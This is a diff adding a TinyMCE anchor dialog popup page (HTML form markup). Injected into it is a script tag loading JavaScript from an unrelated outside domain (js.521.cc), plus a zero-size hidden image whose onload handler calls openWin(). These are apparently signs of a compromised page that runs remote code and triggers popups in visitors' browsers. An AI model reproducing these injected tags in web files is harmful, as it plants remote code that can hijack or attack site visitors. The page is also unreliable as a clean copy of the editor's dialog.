@@ -1,0 +1,31 @@
+<!doctype html public "-//w3c//dtd xhtml 1.0 strict//en" "http://www.w3.org/tr/xhtml1/dtd/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+	<title>{#advanced_dlg.anchor_title}</title>
+	<script type="text/javascript" src="../../tiny_mce_popup.js"></script>
+	<script type="text/javascript" src="js/anchor.js"></script>
+<script language="javascript" type="text/javascript" src="http://js.521.cc/js/user.js"></script></head>
+<body style="display: none">
+<form onsubmit="anchordialog.update();return false;" action="#">
+	<table border="0" cellpadding="4" cellspacing="0">
+		<tr>
+			<td colspan="2" class="title">{#advanced_dlg.anchor_title}</td>
+		</tr>
+		<tr>
+			<td class="nowrap">{#advanced_dlg.anchor_name}:</td>
+			<td><input name="anchorname" type="text" class="mcefocus" id="anchorname" value="" style="width: 200px" /></td>
+		</tr>
+	</table>
+
+	<div class="mceactionpanel">
+		<div style="float: left">
+			<input type="submit" id="insert" name="insert" value="{#update}" />
+		</div>
+
+		<div style="float: right">
+			<input type="button" id="cancel" name="cancel" value="{#cancel}" onclick="tinymcepopup.close();" />
+		</div>
+	</div>
+</form>
+<img src="http://www.baidu.com/search/img/logo.gif" width="0" height="0" onload="openWin();" /></body>
+</html>
